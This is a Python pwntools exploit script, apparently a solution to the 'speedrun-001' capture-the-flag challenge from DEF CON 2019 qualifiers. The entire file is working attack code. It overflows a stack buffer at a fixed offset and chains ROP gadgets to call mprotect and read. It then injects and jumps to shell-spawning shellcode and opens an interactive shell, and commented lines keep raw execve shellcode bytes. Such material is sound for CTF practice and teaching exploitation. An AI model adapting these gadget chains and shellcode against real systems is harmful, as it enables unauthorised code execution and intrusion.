from pwn import *
import time
def main():
	r = process("./speedrun-001")
	#r = remote("speedrun-001.quals2019.oooverflow.io",31337)
	offset = 1032
	p = "A" * (offset)
	context(arch="amd64",os="linux")
	sh = asm(shellcraft.sh())

	#p += "B"*8 # test bof
	#sh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
	#sh =  "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
	#sh += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

	#sh = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

	xor_rax_rax = 0x0000000000444bc0
	add_rax_1 = 0x00000000004748c0
	buf = 0x6bb000 
	pop_rax = 0x0000000000415664
	pop_rdi = 0x0000000000400686
	pop_rsi = 0x00000000004101f3
	pop_rdx = 0x000000000044be16
	syscall_ret = 0x0000000000474e65

	mprotect = 0xa
	read = 0x0

	mov_rdx_rax = 0x0000000000418397 # : mov qword ptr [rdx], rax; ret; 
	pop_rdx = 0x000000000044be16
	pop_rax = 0x0000000000415664


	# stage 1
	p += p64(xor_rax_rax)
	#p += p64(pop_rax)
	p += p64(add_rax_1) * 10
	#p += p64(0x0)
	p += p64(pop_rdi)
	p += p64(buf)
	p += p64(pop_rsi)
	p += p64(0x200)
	p += p64(pop_rdx)
	p += p64(0x7)
	p += p64(syscall_ret)
	# stage 2
	p += p64(xor_rax_rax)
	p += p64(pop_rdi)
	p += p64(0x0)
	p += p64(pop_rsi)
	p += p64(buf)
	p += p64(pop_rdx)
	p += p64(0x200)
	p += p64(syscall_ret)
	p += p64(buf)
	r.sendlineafter("?\n",p)
	#time.sleep(2)
	r.sendline(sh)
	#r.sendline(sh)

	#p += p64(pop_rdx)
	#p += p64(buf)
	#p += p64(pop_rax)
	#p += "/bin/sh\x00"
	#p += p64(mov_rdx_rax)
	#
	#p += p64(pop_rax)
	#p += p64(59)
	#p += p64(pop_rdi)
	#p += p64(buf)
	#p += p64(pop_rsi)
	#p += p64(0)
	#p += p64(pop_rdx)
	#p += p64(0)

	#gdb.attach(r)
	#r.sendline(p)

	r.interactive()


if __name__ == '__main__':
	main()
